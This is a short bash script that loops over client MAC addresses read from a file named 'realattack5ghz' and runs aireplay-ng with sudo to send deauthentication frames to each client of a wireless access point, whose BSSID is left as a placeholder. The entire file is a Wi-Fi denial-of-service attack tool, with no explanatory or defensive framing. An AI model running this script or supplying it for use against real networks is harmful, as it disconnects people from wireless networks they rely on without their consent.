#!/bin/bash

BSSID24="00:00:00:00:00:00"
mon24ghz=adapter



for deauth in $(cat realattack5ghz); do
if [[ $deauth = "< | HWaddress" ]]; then
	echo ""
else
exec xterm -e sudo aireplay-ng --deauth 50 -a $BSSID24 -c $deauth $mon24ghz
fi
done

